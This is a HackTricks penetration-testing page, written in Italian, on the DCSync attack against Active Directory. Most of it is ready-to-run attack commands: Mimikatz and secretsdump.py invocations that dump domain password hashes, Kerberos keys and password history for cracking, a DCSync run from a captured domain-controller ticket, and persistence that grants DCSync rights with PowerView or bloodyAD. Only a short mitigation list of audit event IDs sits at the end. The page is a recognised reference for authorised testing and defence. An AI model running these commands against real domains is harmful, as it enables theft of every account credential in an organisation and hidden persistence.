# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Il permesso **DCSync** implica avere questi permessi sul domain stesso: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.

**Note importanti su DCSync:**

- L'attacco **DCSync simula il comportamento di un Domain Controller e chiede agli altri Domain Controller di replicare le informazioni** usando il Directory Replication Service Remote Protocol (MS-DRSR). Poiché MS-DRSR è una funzione valida e necessaria di Active Directory, non può essere disattivata o disabilitata.
- Per impostazione predefinita solo i gruppi **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** hanno i privilegi richiesti.
- In pratica, il **full DCSync** necessita di **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** sul domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` viene spesso delegato insieme a questi, ma da solo è più rilevante per sincronizzare **attributi confidenziali / filtrati da RODC** (per esempio segreti in stile legacy LAPS) che per un dump completo di krbtgt.
- Se eventuali password degli account sono memorizzate con crittografia reversibile, in Mimikatz è disponibile un'opzione per restituire la password in clear text

### Enumeration

Controlla chi ha questi permessi usando `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Se vuoi concentrarti sui **non-default principals** con diritti DCSync, escludi i gruppi di replica integrati e rivedi solo i trustee inaspettati:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit Localmente
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit Remotely
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Esempi pratici con ambito limitato:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync using a captured DC machine TGT (ccache)

In scenari di export-mode con unconstrained-delegation, puoi catturare un TGT della macchina Domain Controller (ad esempio, `DC1$@DOMAIN` per `krbtgt@DOMAIN`). Puoi poi usare quel ccache per autenticarti come il DC ed eseguire DCSync senza una password.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Note operative:

- **Il percorso Kerberos di Impacket tocca prima SMB** prima della chiamata DRSUAPI. Se l'ambiente applica la **validazione del nome target SPN**, un dump completo può fallire con `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In quel caso, richiedi prima un ticket di servizio **`cifs/<dc>`** per il DC target oppure passa a **`-just-dc-user`** per l'account di cui hai bisogno subito.
- Quando hai solo diritti di replica inferiori, la sincronizzazione in stile LDAP/DirSync può comunque esporre attributi **confidential** o **RODC-filtered** (ad esempio il legacy `ms-Mcs-AdmPwd`) senza una replica completa di krbtgt.

`-just-dc` genera 3 file:

- uno con gli **NTLM hashes**
- uno con le **Kerberos keys**
- uno con le password in chiaro dall'NTDS per eventuali account impostati con [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) abilitata. Puoi ottenere gli utenti con reversible encryption con

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Se sei un domain admin, puoi concedere questi permessi a qualsiasi user con l'aiuto di `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Gli operatori Linux possono fare lo stesso con `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Poi, puoi **controllare se all'utente sono stati assegnati correttamente** i 3 privilegi cercandoli nell'output di (dovresti poter vedere i nomi dei privilegi dentro il campo "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – È stata eseguita un'operazione su un oggetto
- Security Event ID 5136 (Audit Policy for object must be enabled) – Un oggetto del servizio directory è stato modificato
- Security Event ID 4670 (Audit Policy for object must be enabled) – I permessi su un oggetto sono stati modificati
- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
